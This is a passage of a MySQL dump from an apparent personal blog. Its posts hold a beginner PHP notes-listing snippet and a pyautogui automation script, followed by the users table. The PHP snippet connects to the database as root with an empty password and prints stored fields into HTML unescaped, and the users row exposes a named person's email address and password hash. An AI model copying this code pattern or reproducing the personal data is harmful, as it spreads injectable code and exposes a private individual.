scope=\"col\"&gt;Title&lt;/th&gt;\r\n&lt;th scope=\"col\"&gt;Content&lt;/th&gt;\r\n&lt;th scope=\"col\"&gt;Action&lt;/th&gt;\r\n&lt;/tr&gt;\r\n&lt;/thead&gt;\r\n&lt;tbody&gt;\r\n&lt;?php\r\n$servername = \"localhost\";\r\n$username = \"root\";\r\n$password = \"\";\r\n$database = \"without\";\r\n\r\n$connection = mysqli_connect($servername,$username,$password,$database);\r\n// include \'capture.php\';\r\n$i=0;\r\n$select = \"SELECT * FROM `notes`\";\r\n$bring = mysqli_query($connection,$select);\r\nwhile($fetch = mysqli_fetch_assoc($bring)){\r\n$i++;\r\necho \"\r\n&lt;tr&gt;\r\n&lt;th scope=\'row\'&gt;\".$i.\"&lt;/th&gt;\r\n&lt;td&gt;\".$fetch[\'title\'].\"&lt;/td&gt;\r\n&lt;td&gt;\".$fetch[\'content\'].\"&lt;/td&gt;\r\n &lt;td&gt;&lt;a href=\'index.php?edit=\".($fetch[\'id\']).\"\'class=\'btn btn-info\' &gt;edit&lt;/a&gt; &lt;a href=\'index.php?delete=\".($fetch[\'id\']).\"\'class=\'btn btn-danger\'&gt;delete&lt;/a&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n\";\r\n }\r\n?&gt;\r\n&lt;/tbody&gt;\r\n&lt;/table&gt;\r\n\r\n&lt;/div&gt;\r\n&lt;/body&gt;\r\n&lt;script src=\"https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js\" integrity=\"sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV\" crossorigin=\"anonymous\"&gt;&lt;/script&gt;\r\n&lt;/html&gt;</em></strong></pre>'),
(3, 'Automation Using Python', 'About automation', '<div>You\'ve read a beginner resource like Automation with python etc etc but still don\'t feel like a \"real\" programmer? Beyond the Basic Stuff covers software development tools and best practices so you can code like a professional. <br>Go To This link and download my program i have made a desktop assistant friday with full control over my pc so remake this program for your needs : <a href=\"https://github.com/naitik0009/automation\">https://github.com/naitik0009/automation</a></div>', 'post/CT5yyNTbdEUNIj5Y4z8ZHjNAoevHazLne8BYnnjz.png', 'https://youtube.com/embed/AksJqoyHt-I', 1, 1, '2020-12-04 12:30', '2020-12-03 13:44:42', '2020-12-03 13:46:43', '<pre><strong><em>import pyautogui\r\nimport time\r\ndef position():\r\ndirection = currentMouseX,currentMouseY = pyautogui.position()\r\n#move = pyautogui.moveTo(32,41)\r\n# pyautogui.click(\'Jeremy\')\r\nprint(direction)\r\ndef terminal():\r\npyautogui.hotkey(\'ctrl\',\'alt\',\'t\')\r\ntime.sleep(3)\r\npyautogui.hotkey(\'alt\',\'f10\')\r\n\r\ndef exterm():\r\npyautogui.write(\'exit\')\r\npyautogui.hotkey(\'enter\')\r\n\r\ndef youtube():\r\npyautogui.hotkey(\'ctrl\',\'alt\',\'t\')\r\ntime.sleep(3)\r\npyautogui.hotkey(\'alt\',\'f10\')\r\npyautogui.write(\'firefox\')\r\npyautogui.hotkey(\'enter\')\r\ntime.sleep(15)\r\npyautogui.hotkey(\'alt\',\'f10\')\r\ntime.sleep(5)\r\npyautogui.hotkey(\'ctrl\',\'t\')\r\ntime.sleep(3)\r\npyautogui.moveTo(340,425)\r\npyautogui.click()\r\n\r\n\r\ndef fav():\r\npyautogui.moveTo(367,186)\r\npyautogui.click()\r\npyautogui.write(\'Na tum jano na hum\')\r\npyautogui.hotkey(\'enter\')\r\ntime.sleep(5)\r\npyautogui.moveTo(282,376)\r\ntime.sleep(7)\r\npyautogui.click()\r\npyautogui.click()\r\ntime.sleep(6)\r\n# pyautogui.hotkey(\'spacebar\')\r\n\r\ndef fullscreen():\r\npyautogui.hotkey(\'alt\',\'f10\')\r\n\r\ndef closingapp():\r\nmove = pyautogui.moveTo(10,39)\r\npyautogui.click()\r\n\r\ndef click():\r\npyautogui.click()\r\n\r\ndef resume():\r\npyautogui.hotkey(\'k\')\r\n\r\n\r\ndef down():\r\npyautogui.hotkey(\'down\')\r\n\r\npass\r\n\r\ndef facebook():\r\npyautogui.hotkey(\'ctrl\',\'alt\',\'t\')\r\ntime.sleep(3)\r\npyautogui.hotkey(\'alt\',\'f10\')\r\npyautogui.write(\'firefox\')\r\npyautogui.hotkey(\'enter\')\r\ntime.sleep(15)\r\npyautogui.hotkey(\'alt\',\'f10\')\r\ntime.sleep(5)\r\npyautogui.hotkey(\'ctrl\',\'t\')\r\ntime.sleep(3)\r\npyautogui.moveTo(214,422)\r\npyautogui.click()\r\n\r\n\r\nposition()</em></strong></pre>');

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email_verified_at` timestamp NULL DEFAULT NULL,
  `password` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `remember_token` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `image` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `role` enum('writer','admin') COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'writer'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `name`, `email`, `email_verified_at`, `password`, `remember_token`, `created_at`, `updated_at`, `image`, `role`) VALUES
(1, 'Naitik Rauniyar', 'naitikgupta12@gmail.com', NULL, '$2y$10$jRY/A4uZqEvkERFtwqJhlOmLjH3Sqmm0OQ.rP3BsfcXEJ9OX9285m', NULL, '2020-12-03 13:21:58', '2020-12-03 13:21:58', 'post/KYtizQER6G1hTeuVWPuxfgTXXQ6GqGr5qAcnUKby.png', 'writer');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `categories`
--
ALTER TABLE `categories`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `migrations`
--
ALTER TABLE `migrations`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `password_resets`
--
ALTER TABLE `password_resets`
  ADD KEY `password_resets_email_index` (`email`);

--
-- Indexes for table `posts`
--
ALTER TABLE `posts`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `users_email_unique` (`email`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `categories`
--
ALTER TABLE `categories`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;
--
-- AUTO_INCREMENT for table `migrations`
--
ALTER TABLE `migrations`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=39;
--
-- AUTO_INCREMENT for table `posts`
--
ALTER TABLE `posts`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;
--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
